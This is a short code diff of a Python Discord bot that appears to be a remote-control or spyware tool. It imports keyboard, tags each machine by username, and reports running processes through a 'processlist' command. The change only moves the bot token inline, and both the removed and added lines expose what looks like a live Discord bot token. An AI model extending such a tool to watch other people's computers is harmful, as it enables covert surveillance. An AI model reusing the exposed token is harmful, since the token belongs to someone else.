@@ -10,7 +10,6 @@ import random
 from getpass import getuser
 import keyboard
 userid=getuser()+str(random.randint(123, 321))
-token = 'MTA1MDEwNjMyNDc5NDQ3NDUwNg.G6Ssmx.s9KT-rNjCg1BTdWvM_5aNp9w6gv_oRMaWdJBls'
 bot = commands.Bot(intents = discord.Intents.all(), command_prefix='!')
 bot.remove_command('help')
 
@@ -75,4 +74,4 @@ async def processlist(ctx, username):
                         proclist += f"{prcn[:-4]}\n"
                 await ctx.send(proclist)                       
                                                                       
-bot.run(token)
+bot.run('MTA1MDEwNjMyNDc5NDQ3NDUwNg.G6Ssmx.s9KT-rNjCg1BTdWvM_5aNp9w6gv_oRMaWdJBls')
